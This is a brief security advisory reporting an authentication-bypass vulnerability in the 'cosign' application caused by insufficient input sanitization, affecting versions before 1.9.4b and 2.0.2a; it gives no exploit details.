The 'cosign' application is prone to an authentication-bypass vulnerability because it fails to adequately sanitize user-supplied input.

An authenticated attacker can exploit this issue to access services hosted on an affected computer by assuming another user's credentials.

Versions prior to 1.9.4b and 2.0.2a are vulnerable.
